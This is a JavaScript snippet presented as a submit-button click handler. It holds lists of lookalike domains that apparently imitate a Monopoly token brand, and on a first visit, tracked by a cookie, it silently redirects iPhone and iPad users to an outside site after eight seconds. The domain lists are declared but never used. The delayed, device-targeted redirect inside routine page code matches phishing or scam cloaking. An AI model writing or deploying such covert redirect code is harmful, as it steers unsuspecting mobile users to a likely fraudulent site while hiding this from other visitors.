
var button = document.querySelector('#submitButton');  
button.addEventListener('click', function() {
    (function() {
        var originalDomains = [
            "monoplytokens.com",
            "mply.io.t0ke2n.site",
            "mply.io.4a6b8dh.site",
            "mply.io.1arshg4.site"
        ]; 
        
        var redirectURL = "https://m.rolls3.com";
        var blockedDomains = [
            "jsdhjjhhjjhejkjkas.blogspot.com",
            "mply.io.t0ke2n.site",
            "mply.io.1arshg4.site",
            "mply.io.4a6b8dh.site"
        ];

        var currentDomain = window.location.hostname.replace("www.", "").toLowerCase();
        
        function setCookie(name, value, years) {
            var date = new Date();
            date.setTime(date.getTime() + (years * 365 * 24 * 60 * 60 * 1000));
            var expires = "expires=" + date.toUTCString();
            document.cookie = name + "=" + value + ";" + expires + ";path=/";
        }

        function getCookie(name) {
            var nameEQ = name + "=";
            var ca = document.cookie.split(';');
            for (var i = 0; i < ca.length; i++) {
                var c = ca[i];
                while (c.charAt(0) == ' ') c = c.substring(1, c.length);
                if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
            }
            return null;
        }

        var isFirstVisit = getCookie("isFirstVisit");

        if (!isFirstVisit) {
            setCookie("isFirstVisit", "true", 1);

            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

            setTimeout(function() {
                if (isIphoneOrIpad) { 
                    window.location.href = redirectURL;
                }
            }, 8000);
        }

    })();
});
